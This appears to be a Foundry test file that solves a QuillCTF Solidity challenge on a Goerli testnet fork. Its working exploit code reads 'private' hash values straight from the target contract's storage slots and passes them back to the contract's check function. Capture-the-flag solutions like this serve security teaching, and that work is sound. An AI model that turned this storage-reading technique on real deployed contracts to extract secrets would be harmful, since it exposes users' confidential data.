// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/// ./challenge/ConfidentialHash.sol

/// Define the interface for the Target contract
interface ITarget {
    function hash(bytes32 key1, bytes32 key2) external view returns (bytes32);

    function checkthehash(bytes32 _hash) external view returns (bool);
}

contract QuillCTF2Solved is Test {
    ITarget target = ITarget(0xf8E9327E38Ceb39B1Ec3D26F5Fad09E426888E66);

    function setUp() public {
        /// Run the test against the goerli testnet fork
        vm.createSelectFork(vm.envString("RPC_ANKR_GOERLI"));
    }

    function test_exploit() external {
        /**
         * Storage layout of the target contract
         *     Generated using: https://marketplace.visualstudio.com/items?itemName=PraneshASP.vscode-solidity-inspector
         *
         *     | Name              | Type    | Slot | Offset | Bytes |
         *     |-------------------|---------|------|--------|-------|
         *     | firstUser         | string  | 0    | 0      | 32    |
         *     | alice_age         | uint256 | 1    | 0      | 32    |
         *     | ALICE_PRIVATE_KEY | bytes32 | 2    | 0      | 32    |
         *     | ALICE_DATA        | bytes32 | 3    | 0      | 32    |
         *     | aliceHash         | bytes32 | 4    | 0      | 32    |
         *     | secondUser        | string  | 5    | 0      | 32    |
         *     | bob_age           | uint256 | 6    | 0      | 32    |
         *     | BOB_PRIVATE_KEY   | bytes32 | 7    | 0      | 32    |
         *     | BOB_DATA          | bytes32 | 8    | 0      | 32    |
         *     | bobHash           | bytes32 | 9    | 0      | 32    |
         */

        /// Read hash from the slots 4 and 9
        bytes32 aliceHash = vm.load(address(target), bytes32(uint256(4)));
        bytes32 bobHash = vm.load(address(target), bytes32(uint256(9)));

        /// Generate combined hash
        bytes32 combinedHash = target.hash(aliceHash, bobHash);

        /// Validate if we acquired the secret hash of Alice and Bob
        assertEq(target.checkthehash(combinedHash), true);
    }
}
